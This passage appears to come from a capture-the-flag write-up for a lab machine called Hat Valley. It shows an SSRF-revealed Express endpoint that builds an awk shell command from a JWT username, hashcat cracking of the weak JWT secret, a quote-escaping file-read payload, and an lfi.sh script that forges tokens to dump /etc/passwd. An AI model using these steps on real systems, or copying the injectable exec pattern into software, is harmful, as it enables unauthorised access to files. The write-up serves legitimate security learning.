</span></span><span class=line><span class=cl>    &lt;meta http-equiv<span class=o>=</span><span class=s2>&#34;X-UA-Compatible&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;IE=edge&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;meta <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;viewport&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;width=device-width,initial-scale=1.0&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span> <span class=o>=</span> <span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span> <span class=o>=</span> <span class=s2>&#34;/css/main.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/css/bootstrap.min.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;!-- style css --&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/css/style.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;!-- Responsive--&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/css/responsive.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;!-- fevicon --&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;icon&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/blue.png&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;image/png&#34;</span> /&gt;
</span></span><span class=line><span class=cl>    &lt;!-- Scrollbar Custom CSS --&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/css/jquery.mCustomScrollbar.min.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;!-- Tweaks <span class=k>for</span> older IEs--&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/css/font-awesome.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/css/jquery.fancybox.min.css&#34;</span> <span class=nv>media</span><span class=o>=</span><span class=s2>&#34;screen&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/vendors/mdi/css/materialdesignicons.min.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/vendors/feather/feather.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/vendors/base/vendor.bundle.base.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/vendors/flag-icon-css/css/flag-icon.min.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/vendors/font-awesome/css/font-awesome.min.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/vendors/jquery-bar-rating/fontawesome-stars-o.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/vendors/jquery-bar-rating/fontawesome-stars.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/css/style.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Hat Valley&lt;/title&gt;
</span></span><span class=line><span class=cl>  &lt;link <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/js/app.js&#34;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;preload&#34;</span> <span class=nv>as</span><span class=o>=</span><span class=s2>&#34;script&#34;</span>&gt;&lt;link <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/js/chunk-vendors.js&#34;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;preload&#34;</span> <span class=nv>as</span><span class=o>=</span><span class=s2>&#34;script&#34;</span>&gt;&lt;/head&gt;
</span></span><span class=line><span class=cl>  &lt;body&gt;
</span></span><span class=line><span class=cl>    &lt;noscript&gt;
</span></span><span class=line><span class=cl>      &lt;strong&gt;We<span class=s1>&#39;re sorry but hat-valley doesn&#39;</span>t work properly without JavaScript enabled. Please <span class=nb>enable</span> it to <span class=k>continue</span>.&lt;/strong&gt;
</span></span><span class=line><span class=cl>    &lt;/noscript&gt;
</span></span><span class=line><span class=cl>    &lt;div <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;app&#34;</span>&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;!-- built files will be auto injected --&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/jquery.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/popper.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/bootstrap.bundle.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/jquery-3.0.0.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/plugin.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;!-- sidebar --&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/jquery.mCustomScrollbar.concat.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/custom.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/jquery.fancybox.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/static/vendors/base/vendor.bundle.base.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/static/js/off-canvas.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/static/js/hoverable-collapse.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/static/js/template.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/static/vendors/chart.js/Chart.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/static/vendors/jquery-bar-rating/jquery.barrating.min.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/static/js/dashboard.js&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>  &lt;script <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/javascript&#34;</span> <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/chunk-vendors.js&#34;</span>&gt;&lt;/script&gt;&lt;script <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/javascript&#34;</span> <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;/js/app.js&#34;</span>&gt;&lt;/script&gt;&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>So we&rsquo;ve confirmed port 8080 is likely the internal port serving the main web-app we&rsquo;ve been accessing via port 80 externally. If we look at 3002 by browsing to <a href="http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:3002%22" target=_blank rel="noopener noreffer">http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:3002%22</a>, it looks like we have the API:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-01-20-40-26-image.png data-srcset="./assets/2023-02-01-20-40-26-image.png, ./assets/2023-02-01-20-40-26-image.png 1.5x, ./assets/2023-02-01-20-40-26-image.png 2x" data-sizes=auto alt=./assets/2023-02-01-20-40-26-image.png title=./assets/2023-02-01-20-40-26-image.png></p><p>Not only that, but we get the Express / Node code for each route! Super handy, thanks! The first thing that immediately stood out was an <code>exec</code> in the <code>/api/all-leave</code> endpoint &ndash; which calls out to awk (and awkward is the machine name.. geddit?). This returns lines of leave in the CSV for the given user (taken from the JWT and returns these in the response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/api/all-leave&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user_token</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>token</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>authFailed</span> <span class=o>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>user</span> <span class=o>=</span> <span class=kc>null</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nx>user_token</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>decodedToken</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>verify</span><span class=p>(</span><span class=nx>user_token</span><span class=p>,</span> <span class=nx>TOKEN_SECRET</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>decodedToken</span><span class=p>.</span><span class=nx>username</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>authFailed</span> <span class=o>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>user</span> <span class=o>=</span> <span class=nx>decodedToken</span><span class=p>.</span><span class=nx>username</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nx>authFailed</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span><span class=nb>Error</span><span class=o>:</span> <span class=s2>&#34;Invalid Token&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Invalid user&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>bad</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;;&#34;</span><span class=p>,</span><span class=s2>&#34;&amp;&#34;</span><span class=p>,</span><span class=s2>&#34;|&#34;</span><span class=p>,</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;&lt;&#34;</span><span class=p>,</span><span class=s2>&#34;*&#34;</span><span class=p>,</span><span class=s2>&#34;?&#34;</span><span class=p>,</span><span class=s2>&#34;`&#34;</span><span class=p>,</span><span class=s2>&#34;$&#34;</span><span class=p>,</span><span class=s2>&#34;(&#34;</span><span class=p>,</span><span class=s2>&#34;)&#34;</span><span class=p>,</span><span class=s2>&#34;{&#34;</span><span class=p>,</span><span class=s2>&#34;}&#34;</span><span class=p>,</span><span class=s2>&#34;[&#34;</span><span class=p>,</span><span class=s2>&#34;]&#34;</span><span class=p>,</span><span class=s2>&#34;!&#34;</span><span class=p>,</span><span class=s2>&#34;#&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>badInUser</span> <span class=o>=</span> <span class=nx>bad</span><span class=p>.</span><span class=nx>some</span><span class=p>(</span><span class=kr>char</span> <span class=p>=&gt;</span> <span class=nx>user</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=kr>char</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nx>badInUser</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Bad character detected.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>exec</span><span class=p>(</span><span class=s2>&#34;awk &#39;/&#34;</span> <span class=o>+</span> <span class=nx>user</span> <span class=o>+</span> <span class=s2>&#34;/&#39; /var/www/private/leave_requests.csv&#34;</span><span class=p>,</span> <span class=p>{</span><span class=nx>encoding</span><span class=o>:</span> <span class=s1>&#39;binary&#39;</span><span class=p>,</span> <span class=nx>maxBuffer</span><span class=o>:</span> <span class=mi>51200000</span><span class=p>},</span> <span class=p>(</span><span class=nx>error</span><span class=p>,</span> <span class=nx>stdout</span><span class=p>,</span> <span class=nx>stderr</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>stdout</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>200</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=k>new</span> <span class=nx>Buffer</span><span class=p>(</span><span class=nx>stdout</span><span class=p>,</span> <span class=s1>&#39;binary&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Failed to retrieve leave requests&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>stderr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Failed to retrieve leave requests&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span></code></pre></td></tr></table></div></div><p>So first, we need to control the username which means we need to be able to sign JWTs, given the username is pulled from a decoded JWT &ndash; and then the username is checked for some bad characters, which we can&rsquo;t include in our payload. We don&rsquo;t have the JWT signing key <code>TOKEN_SECRET</code>, but maybe we can crack it (assuming it&rsquo;s weak) using our existing token provided to us when logging in with the compromised christopher.jones account?</p><p>Using <a href=https://github.com/mike-engel/jwt-cli target=_blank rel="noopener noreffer">jwt-cli</a>, written in rust:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$jwt</span> decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1NDE3NzcyfQ.O66uNpvfZtH5Ifi8Cdvc8VssC_zK55fN-aA8nMJcbFc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Token header
</span></span><span class=line><span class=cl>------------
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;typ&#34;</span>: <span class=s2>&#34;JWT&#34;</span>,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;alg&#34;</span>: <span class=s2>&#34;HS256&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Token claims
</span></span><span class=line><span class=cl>------------
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;iat&#34;</span>: 1675417772,
</span></span><span class=line><span class=cl>  <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;christopher.jones&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Based on the algorithm, it looks like we can attempt to crack JWT with hashcat, using mode 16500 for <code>JWT (JSON Web Token)</code>. As always, I start with <code>rockyou.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$hashcat</span> -m <span class=m>16500</span> -a <span class=m>0</span> jwt_token.txt /usr/share/wordlists/rockyou.txt 
</span></span><span class=line><span class=cl>hashcat <span class=o>(</span>v6.1.1<span class=o>)</span> starting...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>INFO: All hashes found in potfile! Use --show to display them.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Started: Fri Feb  <span class=m>3</span> 21:04:26 <span class=m>2023</span>
</span></span><span class=line><span class=cl>Stopped: Fri Feb  <span class=m>3</span> 21:04:26 <span class=m>2023</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>zara@supernova<span class=o>]</span>─<span class=o>[</span>~/hat-valley<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$hashcat</span> -m <span class=m>16500</span> -a <span class=m>0</span> jwt_token.txt --show /usr/share/wordlists/rockyou.txt 
</span></span><span class=line><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1NDE3NzcyfQ.O66uNpvfZtH5Ifi8Cdvc8VssC_zK55fN-aA8nMJcbFc:123beany123
</span></span></code></pre></td></tr></table></div></div><p>So, the TOKEN_SECRET is <code>123beany123</code>.</p><p>I played around with a basic replication of the above express endpoint locally, and worked out we can escape awk and do basic Local File Inclusion with a custom username. E.g.:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/&#39; /etc/passwd &#39;/
</span></span></code></pre></td></tr></table></div></div><p>This will result in the following &ndash; showing us all lines of <code>/etc/passwd</code> or any file the web server&rsquo;s user account has permission to read, rather than the expected CSV file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>awk <span class=s1>&#39;//&#39;</span> /etc/passwd <span class=s1>&#39;//&#39;</span> /var/www/private/leave_requests.csv
</span></span></code></pre></td></tr></table></div></div><p>I ran this LFI against a couple of files which didn&rsquo;t lead anywhere. At this point, suspecting more enumeration across files was required, I decided to write a script taking any filename as an argument to simplify things &ndash; then testing this script for <code>/etc/passwd</code>, injecting this path into the username of the encoded JWT, which gave the following results:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$cat</span> lfi.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/env bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>JSON_PAYLOAD</span><span class=o>=</span><span class=k>$(</span>cat <span class=s>&lt;&lt; EOF
</span></span></span><span class=line><span class=cl><span class=s>{&#34;username&#34;: &#34;/&#39; ${1} &#39;/&#34;}
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>JWT</span><span class=o>=</span><span class=k>$(</span>jwt encode --secret 123beany123 <span class=s2>&#34;</span><span class=nv>$JSON_PAYLOAD</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Sending JWT with curl request: </span><span class=si>${</span><span class=nv>JWT</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>curl <span class=s1>&#39;http://hat-valley.htb/api/all-leave&#39;</span> -H <span class=s2>&#34;Cookie: token=</span><span class=si>${</span><span class=nv>JWT</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$./lfi.sh /etc/passwd
</span></span><span class=line><span class=cl>Sending JWT with curl request: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzU0OTU1MDAsInVzZXJuYW1lIjoiLycgL2V0Yy9wYXNzd2QgJy8ifQ.j3fsA9EF4hIRr9Rdt2xlJkJ99yDPT4400lJu4lZWFnQ
</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>bin❌2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys❌3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games❌5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man❌6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class=line><span class=cl>lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail❌8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class=line><span class=cl>news❌9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class=line><span class=cl>proxy❌13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class=line><span class=cl>backup❌34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class=line><span class=cl>irc❌39:39:ircd:/run/ircd:/usr/sbin/nologin
